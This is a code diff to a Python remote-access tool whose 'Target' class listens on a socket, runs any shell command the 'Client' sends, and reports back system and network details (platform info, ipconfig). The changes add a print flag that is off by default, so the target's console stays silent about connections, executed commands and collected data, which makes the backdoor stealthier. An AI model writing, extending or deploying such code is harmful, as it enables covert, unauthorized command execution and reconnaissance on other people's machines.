@@ -17,8 +17,9 @@ class Machine:
 
 
 # client is "us"
+# Default: 127.0.0.1
 class Client(Machine):
-    def __init__(self, host="127.0.0.1", port=9999):
+    def __init__(self, host, port=9999):
         super().__init__()
         self.host = host
         self.port = port
@@ -53,6 +54,9 @@ class Client(Machine):
         print(info.decode("utf-8"))
         input("\n\nPress ENTER")
 
+    def print_target(self):
+        self.s.send(str.encode("print_target"))
+
 
 # Target is the server
 class Target(Machine):
@@ -63,10 +67,12 @@ class Target(Machine):
         self.host = host
         self.port = port
         self.information = []
+        self.print = False
 
     # bind de socket with the port
     def socket_bind(self):
-        print("Bidding socket to port " + str(self.port))
+        if self.print:
+            print("Bidding socket to port " + str(self.port))
         try:
             self.s.bind((self.host, self.port))
             self.s.listen(5)
@@ -78,15 +84,21 @@ class Target(Machine):
     # accept the new co
     def socket_accept(self):
         self.s, self.information = self.s.accept()
-        print("Connexion has been establish | " + "IP " + self.information[0] + " | Port : " + str(self.information[1]))
+        if self.print:
+            print("Connexion has been establish | " + "IP " + self.information[0] + " | Port : " +
+                  str(self.information[1]))
 
     def what_to_do(self):
         while True:
             instruction = self.s.recv(2048)
             instruction = instruction.decode("utf-8")
             if instruction == "quit":
+                if self.print:
+                    print("Leave the programme... Bye")
                 self.quit()
                 break
+            elif instruction == "print_target":
+                self.print = True
             elif instruction == "shell":
                 self.reverse_shell_target()
             elif instruction == "getinfo_generality":
@@ -98,6 +110,8 @@ class Target(Machine):
         while True:
             data = self.s.recv(4096)
             if data.decode("utf-8") == "quit":
+                if self.print:
+                    print("Leaving Shell")
                 self.s.send(str.encode("we are leaving \n"))
                 break
             else:
@@ -110,10 +124,12 @@ class Target(Machine):
                         output_bytes = cmd.stdout.read() + cmd.stderr.read()
                         output_str = output_bytes.decode("utf-8", errors='replace')
                         self.s.send(str.encode(output_str + str(os.getcwd()) + "> "))
-                        print(output_str)
+                        if self.print:
+                            print(output_str)
                 except OSError as msg:
                     error_msg = "Error OS : " + str(msg)
-                    print(error_msg)
+                    if self.print:
+                        print(error_msg)
                     self.s.send(str.encode(error_msg))
 
     # Get information from the target
@@ -125,14 +141,22 @@ class Target(Machine):
                                + "\nVersion: " + platform.uname()[3]
                                + "\nMachine: " + platform.uname()[4]
                                + "\nProcessor: " + platform.uname()[5]))
+        if self.print:
+            print("YOUR INFORMATION \n")
+            print("System: " + platform.uname()[0] + "\nUser (node): " + platform.uname()[1] + "\nRelease: "
+                  + platform.uname()[2] + "\nVersion: " + platform.uname()[3] + "\nMachine: " + platform.uname()[4]
+                  + "\nProcessor: " + platform.uname()[5])
 
     def getinfo_target_network(self):
         cmd = subprocess.Popen("ipconfig", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                   stdin=subprocess.PIPE)
+                               stdin=subprocess.PIPE)
         output_bytes = cmd.stdout.read() + cmd.stderr.read()
         output_str = output_bytes.decode("utf-8", errors='replace')
         self.s.send(str.encode("Configuration IP: "))
         self.s.send(str.encode(output_str))
+        if self.print:
+            print("Configuration IP: ")
+            print(output_str)
 
     # close de connection and the socket
     def quit(self):
